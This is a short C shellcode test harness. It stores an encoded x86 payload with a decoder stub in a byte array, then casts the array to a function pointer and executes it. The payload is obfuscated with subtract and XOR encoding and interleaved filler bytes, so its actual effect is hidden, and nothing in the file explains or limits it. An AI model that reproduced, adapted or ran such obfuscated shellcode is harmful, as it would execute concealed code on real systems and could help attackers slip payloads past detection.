#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x29\x5e\x80\x2e\x05\x80\x36\xbb\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xcc\x75\x16\x8a\x5c\x06\x01\x88\x1f\x80\x2f\x05\x80\x37\xbb\x47\x04\x02\xeb\xe7\xe8\xd2\xff\xff\xff\x8f\xcc\x80\xcc\x8f\xcc\x65\xcc\x8f\xcc\x77\xcc\x8f\xcc\x6e\xcc\x8f\xcc\x52\xcc\x8f\xcc\x49\xcc\xe2\xcc\x08\xcc\xe1\xcc\xbf\xcc\x0d\xcc\xbe\xcc\x0f\xcc\xbf\xcc\x7b\xcc\x40\xcc\x37\xcc\x82\xcc\x37\xcc\x7d\xcc\x0f\xcc\xbd\xcc\x8f\xcc\x80\xcc\x10\xcc\x89\xcc\x7b\xcc\x40\xcc\xf7\xcc\xc7\xcc\x51\xcc\x8f\xcc\x65\xcc\x37\xcc\x4d\xcc\xe2\xcc\x08\xcc\xd6\xcc\xbf\xcc\xf1\xcc\xd8\xcc\x80\xcc\x18\xcc\x78\xcc\x38\xcc\xe2\xcc\xd8\xcc\xaf\xcc\xec\xcc\xe2\xcc\xd6\xcc\xbe\xcc\x37\xcc\x5f\xcc\x0e\xcc\xe2\xcc\x7b\xcc\x40\xcc\x8f\xcc\x80\xcc\xf0\xcc\xd8\xcc\x99\xcc\x99\xcc\xcd\xcc\xd8\xcc\xd8\xcc\x99\xcc\xde\xcc\xd7\xcc\xda\xcc\x37\xcc\x5d\xcc\xf0\xcc\x37\xcc\x5e\xcc\xed\xcc\x37\xcc\x5f\xcc\x10\xcc\xb5\xcc\x7b\xcc\x40\xcc\xdd\xdd";

int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
